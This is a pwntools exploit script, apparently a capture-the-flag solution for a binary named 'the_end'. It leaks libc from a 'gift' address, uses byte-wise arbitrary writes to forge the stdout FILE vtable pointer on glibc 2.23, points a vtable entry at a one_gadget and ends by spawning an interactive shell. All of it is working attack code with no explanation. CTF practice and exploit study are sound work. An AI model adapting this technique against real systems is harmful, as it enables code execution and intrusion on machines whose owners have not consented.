from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./the_end")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./the_end")
else:
	#socat tcp-l:8080,fork exec:./the_end
	p = remote("127.0.0.1","8080")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./the_end")
	

def write(addr,value):
	p.send(p64(addr))
	p.send(chr(value))

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x955)))
	#gdb.attach(p,"b exit")
# p _IO_2_1_stdout_
# p &_IO_2_1_stdout_

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
p.recvuntil("here is a gift ")
sleep_addr = int(p.recvuntil(",",drop = True),16)
p.recvuntil(" good luck ;)\n")
libc.address = sleep_addr - libc.symbols["sleep"]
log.success("libc_base:"+hex(libc.address))
vtable_addr = libc.address + 0x3c56f8
target_vtable = libc.address + 0x3c51e0
targetfunc_addr = libc.address + 0x3c5238
one_gadget = libc.address + 0xf02b0
log.success("vtable_addr:"+hex(vtable_addr))
log.success("target_vtable:"+hex(target_vtable))
log.success("targetfunc_addr:"+hex(targetfunc_addr))
log.success("one_gadget:"+hex(one_gadget))

#debugf()
# fake vatable
for i in range(2):
	write(vtable_addr + i,(target_vtable>>(i*8))&0xff)

# fake function
for i in range(3):
	write(targetfunc_addr + i,(one_gadget>>(i*8))&0xff)

#p.sendline("cat flag>&0")
#print p.recvuntil("}")
p.sendline("exec /bin/sh 1>&0")
p.interactive()
